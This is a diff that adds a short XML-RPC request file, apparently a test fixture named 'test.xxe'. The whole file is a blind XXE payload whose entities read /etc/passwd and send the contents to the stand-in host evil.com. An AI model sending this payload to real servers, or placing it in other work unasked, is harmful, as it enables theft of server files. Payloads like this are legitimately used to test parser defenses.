@@ -1,0 +1,11 @@
+<?xml version="1.0"?>
+<!DOCTYPE methodCall [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">
+  %eval;
+  %exfil;
+]>
+<methodCall>
+<methodName>test.xxe</methodName>
+<params/>
+</methodCall>
